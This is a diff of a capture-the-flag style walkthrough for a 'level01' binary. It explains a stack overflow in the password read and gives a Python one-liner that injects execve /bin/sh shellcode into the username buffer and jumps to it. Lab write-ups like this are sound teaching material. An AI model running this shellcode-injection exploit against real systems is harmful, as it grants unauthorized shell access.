@@ -1,12 +1,17 @@
-Level01
+# level01 walkthrough
+#
 
-We have a binary called level01
-lets debug it using gdb and decompile it using ghidra
-We cant find a system call with shell or .pass so we gonna need to inject a shell code
-We have a buffer overflow of the buffer is initialized with 16 but in fgets we can out 100bytes
-First we need to put as a user name "dat_wil" + 249 bytes to exced the user_name global variable and the first gets dat gets 0x100 bytes 256 bytes  so we can put it in a pyaload after that we gonna move to password prompt where the buffer overflow exists so  at 79 bytes it change in return address so lets put a code shell wherever we want we can put it in username or password then call it so the  pwaylaod will be somthing like this :
+The binary is implementing a username and password check, it reads from stdin two times the user then the pass
 
-dat_will + shellcode 25bytes+ NOP * 256-32 +  NOP * 79 + shellcode address
+The read for user is done through reading into a buffer in the data segment (0x804a040) i.e global char array named a_user_name
 
-(python -c "print 'dat_wil'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'a'*303 + '\x47\xa0\x04\x08'";cat) | ./level01
+In the read for the password it reads into a local char array with addr (esp+0x1c) and size 0x10, the full length of 0x64, this is a stack overflow vulnerability, we can overide the return addr of the <main> stack frame.
 
+The binary doesn't contain code running system("/bin/sh") hence we need to inject shellcode.
+
+First we will need to know the distance between (esp+0x1c) begining of our vulnerable buffer and ebp+0x4 the location of the return address.
+This can easily be done with gdb. The distance is 80.
+
+We will inject the shellcode right after the username, the address we should jump to is a_user_name+7,
+
+python -c "print 'dat_wil'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'+(0x100-7-25)*'a' +79*'a'+'\x47\xa0\x04\x08'"
